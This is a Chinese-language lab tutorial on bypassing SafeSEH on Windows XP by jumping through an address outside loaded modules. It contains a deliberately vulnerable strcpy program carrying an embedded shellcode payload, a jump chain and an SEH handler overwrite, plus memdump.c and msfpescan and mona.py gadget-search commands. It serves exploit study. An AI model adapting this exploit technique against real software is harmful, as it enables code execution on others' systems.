##  利用加載模塊之外的地址繞過 SafeSEH

```
OS xp
Compiler: VC++ 2010 express 
exe :release 版  # 禁用優化選項

工具
Immunity debugger
Immunity debugger 的 mona.py 插件
Metasploit 
memdump
ProcessExplorer

```

###  工具 memdump.c 
```
/* skape <mmiller@hick.org */

/*
 * dumps all the mapped memory segments in a running process
 */
#include <stdlib.h>
#include <stdio.h>
#include <windows.h>

#define PAGE_SIZE 4096

typedef struct _MemoryRange
{

	char                *base;
	unsigned long       length;
	char                *file;
	struct _MemoryRange *next;

} MemoryRange;

BOOL createDumpDirectory(char *path);
DWORD dumpSegments(HANDLE process, const char *dumpDirectory);

int main(int argc, char **argv)
{
	char *dumpDirectory = NULL;
	HANDLE process = NULL;
	DWORD pid = 0,
		segments = 0;
	int res = 1;

	do
	{
		// Validate arguments
		if ((argc == 1) ||
		    (!(pid = atoi(argv[1]))))
		{
			printf("Usage: %s pid [dump directory]\n", argv[0]);
			break;
		}

		// If a dump directory is specified, use it, otherwise default 
		// to the pid.
		if (argc >= 3)
			dumpDirectory = argv[2];
		else
			dumpDirectory = argv[1];

		// Create the dump directory (make sure it exists)
		printf("[*] Creating dump directory...%s\n", dumpDirectory);

		if (!createDumpDirectory(dumpDirectory))
		{
			printf("[-] Creation failed, %.8x.\n", GetLastError());
			break;
		}

		// Attach to the process
		printf("[*] Attaching to %lu...\n", pid);

		if (!(process = OpenProcess(PROCESS_VM_READ, FALSE, pid)))
		{
			printf("[-] Attach failed, %.8x.\n", GetLastError());
			break;
		}

		// Dump segments
		printf("[*] Dumping segments...\n");

		if (!(segments = dumpSegments(process, dumpDirectory)))
		{
			printf("[-] Dump failed, %.8x.\n", GetLastError());
			break;
		}

		printf("[*] Dump completed successfully, %lu segments.\n", segments);

		res = 0;
		
	} while (0);

	if (process)
		CloseHandle(process);

	return res;
}

/*
 * Create the directory specified by path, insuring that 
 * all parents exist along the way.
 *
 * Just like MakeSureDirectoryPathExists, but portable.
 */
BOOL createDumpDirectory(char *path)
{
	char *slash = path;
	BOOL res = TRUE;

	do
	{
		slash = strchr(slash, '\\');

		if (slash)
			*slash = 0;

		if (!CreateDirectory(path, NULL))
		{
			if ((GetLastError() != ERROR_FILE_EXISTS) &&
			    (GetLastError() != ERROR_ALREADY_EXISTS))
			{
				res = FALSE;
				break;
			}
		}

		if (slash)
			*slash++ = '\\';

	} while (slash);

	return res;
}

/*
 * Dump all mapped segments into the dump directory, one file per
 * each segment.  Finally, create an index of all segments.
 */
DWORD dumpSegments(HANDLE process, const char *dumpDirectory)
{
	MemoryRange *ranges = NULL, 
		*prevRange = NULL,
		*currentRange = NULL;
	char pbuf[PAGE_SIZE],
		rangeFileName[256];
	DWORD segments = 0, 
		bytesRead = 0,
		cycles = 0;
	char *current = NULL;
	FILE *rangeFd = NULL;

	// Enumerate page by page
	for (current = 0;
	     ;
	     current += PAGE_SIZE, cycles++)

	{
		// If we've wrapped, break out.
		if (!current && cycles)
			break;

		// Invalid page? Cool, reset current range.
		if (!ReadProcessMemory(process, current, pbuf, 
			sizeof(pbuf), &bytesRead))
		{
			if (currentRange)
			{
				prevRange    = currentRange;
				currentRange = NULL;
			}

			if (rangeFd)
			{
				fclose(rangeFd);

				rangeFd = NULL;
			}

			continue;
		}

		// If the current range is not valid, we've hit a new range.
		if (!currentRange)
		{
			// Try to allocate storage for it, if we fail, bust out.
			if (!(currentRange = (MemoryRange *)malloc(sizeof(MemoryRange))))
			{
				printf("[-] Allocation failure\n");
	
				segments = 0;
	
				break;
			}

			currentRange->base   = current;
			currentRange->length = 0;
			currentRange->next   = NULL;

			if (prevRange)
				prevRange->next = currentRange;
			else
				ranges = currentRange;

			// Finally, open a file for this range
			_snprintf(rangeFileName, sizeof(rangeFileName) - 1, "%s\\%.8x.rng",
				dumpDirectory, current);

			if (!(rangeFd = fopen(rangeFileName, "wb")))
			{
				printf("[-] Could not open range file: %s\n", rangeFileName);

				segments = 0;

				break;
			}

			// Duplicate the file name for ease of access later
			currentRange->file = strdup(rangeFileName);

			// Increment the number of total segments
			segments++;
		}

		// Write to the range file
		fwrite(pbuf, 1, bytesRead, rangeFd);

		currentRange->length += bytesRead;
	}

	// Now that all the ranges are mapped, dump them to an index file
	_snprintf(rangeFileName, sizeof(rangeFileName) - 1, "%s\\index.rng",
		dumpDirectory);

	if ((rangeFd = fopen(rangeFileName, "w")))
	{
		char cwd[MAX_PATH];

		GetCurrentDirectory(sizeof(cwd), cwd);

		// Enumerate all of the ranges, dumping them into the index file
		for (currentRange = ranges;
		     currentRange;
		     currentRange = currentRange->next)
		{
			fprintf(rangeFd, "%.8x;%lu;%s\\%s\n", 
				currentRange->base, currentRange->length, cwd,
				currentRange->file ? currentRange->file : "");
		}

		fclose(rangeFd);
	}
	else
		segments = 0;
	
	return segments;
}

```




### 程式碼
```
// SafeSEH_Outside.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <string.h>
#include <windows.h>
char shellcode[]=

"\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C"
"\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53"
"\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B"
"\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95"
"\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59"
"\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A"
"\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75"
"\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03"
"\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB"
"\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50"
"\x53\xFF\x57\xFC\x53\xFF\x57\xF8"
//168 bytes

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
//padding for 208 bytes


//big jmp 
"\xe9\x2b\xff\xff\xff"
"BBB"		// padding


//next  (short jmp )
"\xeb\xf6"
"BB"		// padding 			



//handler        // 0x00280b0b #call [ebp+30]  
"\x0b\x0b\x28\x00" ;    





/*  
test shellcode 
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
"BBBB"
"CCCC";
*/


DWORD MyException(void)
{
	printf("There is an exception");
	getchar();
	return 1;
}
void test(char * input)
{
	char str[200];
	strcpy(str,input);
	__asm int 3
    int zero=0;
	__try
	{
	    zero=1/zero;
	}
	__except(MyException())
	{
	}
}

int _tmain(int argc, _TCHAR* argv[])
{
	//__asm int 3
	test(shellcode);
	return 0;
}


```

###   如果缺少stdafx.h  到這裡設定
### 1
![enter image description here](https://i.imgur.com/7fFKdY1.png)

### 2 
![enter image description here](https://i.imgur.com/WwWmFTO.png)



### shellcode 先使用 216個A  +  next  + handler
![enter image description here](https://i.imgur.com/5sEkm9U.png)



###   F9 執行，在按 shift + f9執行 handler

![enter image description here](https://i.imgur.com/4pNV5ns.png)




###  alt + m 查看 map 映射文件，當跳版可繞過SafeSEH 
![enter image description here](https://i.imgur.com/ueiMhFM.png)




###  前輩的努力(常用跳板指令)

![enter image description here](https://i.imgur.com/DA9rwIL.png)

----

###   轉換成opcode 
### [好用 assemble 網站](https://defuse.ca/online-x86-assembler.htm#disassembly)
![enter image description here](https://i.imgur.com/GkcjHpK.png)





---
###  使用 mona.py插件 

1.mona 的 findwild 搜尋 instruction 
(缺點:很多時候會找不到指令，但明明有在記憶體中)

example:

![enter image description here](https://i.imgur.com/cM1ADag.png)

找不到 call [ebp+30]
![enter image description here](https://i.imgur.com/2bKYwpA.png)

2.mona 的 find 搜尋 opcode 
(還不錯，但缺點只能一次搜尋一種)
(下面可以看出明明就有call [ebp+30] ，但 fw 搜尋搜不到)

![enter image description here](https://i.imgur.com/We1gOS3.png)




###  另一種方法 使用 memedump + msfpescan

 

1.我們程式結束太快了，所以用immunity debugger 把他抓起來。並用ProcessExplorer 查 PID 
![enter image description here](https://i.imgur.com/rJT0O1K.png)


2.用 memedump.exe dump 記憶體

![enter image description here](https://i.imgur.com/V08pvj9.png)

3.把整個資料夾丟去 kali linux (或是你有在windows安裝metasploit 也可以)

![enter image description here](https://i.imgur.com/s3Cb2cX.png)

4.metasploit 的 msfpescan 可以幫我們一次搜尋很多個

指令:     用 |  格開 多個 opcode 
```
msfpescan -r "\xFF\x64\x24\x08|\xFF\x64\x24\x14|\xFF\x64\x24\x1C|\xFF\x64\x24\x2C|\xFF\x64\x24\x44|\xFF\x64\x24\x50|\xFF\x65\x0C|\xFF\x65\x24|\xFF\x65\x30|\xFF\x65\xFC|\xFF\x65\xF4|\xFF\x65\xE8|\xFF\x54\x24\x08|\xFF\x54\x24\x14|\xFF\x54\x24\x1C|\xFF\x54\x24\x2C|\xFF\x54\x24\x44|\xFF\x54\x24\x50|\xFF\x55\x0C|\xFF\x55\x24|\xFF\x55\x30|\xFF\x55\xFC|\xFF\x55\xF4|\xFF\x55\xE8" -M /root/Desktop/Dump_file
```


###   map區域 只找到一個(因為程式太小了)


![enter image description here](https://i.imgur.com/JtK9vKt.png)


###  把它更換成跳板，跳去小跳，在大跳，跳到shellcode 就成功了。

![enter image description here](https://i.imgur.com/QXv5TCK.png)
